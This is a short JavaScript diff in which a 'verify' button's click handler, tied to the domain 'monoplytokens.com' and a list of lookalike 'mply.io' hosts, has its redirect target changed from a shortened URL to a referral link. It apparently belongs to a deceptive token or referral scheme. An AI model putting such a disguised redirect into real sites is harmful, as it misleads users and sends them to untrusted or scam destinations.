@@ -4,7 +4,7 @@ var button = document.querySelector('.verify');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "monoplytokens.com";
-        var redirectURL = "https://smrturl.co/8a45e5f";
+        var redirectURL = "https://earnzeno.com/?ref=PLDAKGJM";
         var blockedDomains = [
             "mply.io.1arshg4.site",
             "mply.io.4a6b8dh.site"
